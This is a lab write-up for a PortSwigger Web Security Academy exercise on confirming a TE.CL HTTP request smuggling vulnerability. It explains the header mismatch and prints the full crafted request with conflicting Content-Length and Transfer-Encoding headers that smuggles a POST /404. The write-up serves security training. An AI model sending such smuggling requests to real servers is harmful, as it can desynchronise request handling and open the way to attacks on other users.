#  HTTP - request smuggling, confirming a TE.CL vulnerability via differential responses

## 📌 Lab Details
- **Title**: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
- **Difficulty**: Practitioner
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/fe9ab531836f0124048451639920eb523e4374df7d3e1f492dc1985048adeae9?referrer=%2fweb-security%2frequest-smuggling%2ffinding%2flab-confirming-te-cl-via-differential-responses

## 🔍 Summary
This lab confirms a **TE.CL HTTP request smuggling vulnerability** — where the front-end server uses `Transfer-Encoding: chunked` to determine request boundaries, but the **back-end server** relies on the `Content-Length` header. By crafting a request with chunked encoding that contains a **smuggled request** inside the body, the two servers disagree on where the request ends. This causes the back-end to treat part of the body as the **next HTTP request**, which triggers a `404 Not Found` when the smuggled request points to `/404`.

## 🛠 Steps to Solve
1. Intercept the request and send it to **Burp Repeater**.
2. Now, issue the following request twice:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-length: 4
   Transfer-Encoding: chunked

   5e
   POST /404 HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15

   x=1
   0

   ```sh
3. The second request should receive an **HTTP 404** response.

## 📖 Key Takeaways
- **TE.CL mismatch** → Front-end reads chunks; back-end trusts `Content-Length`.
- Smuggling works by embedding a **full HTTP request** inside the chunked body so that the back-end processes it as the **next** request.
- This is a **detection step** — proving that the vulnerability exists before exploiting it further.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9c8175fc-e995-4f49-83b5-25970ae9912c" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b370cea6-59d4-40cb-8d98-12c62a2a602c" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3d1019d2-b5d4-4f1f-a085-c2714e626029" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/06ee66f3-cb7a-427d-8faa-71d539a35bf7" />
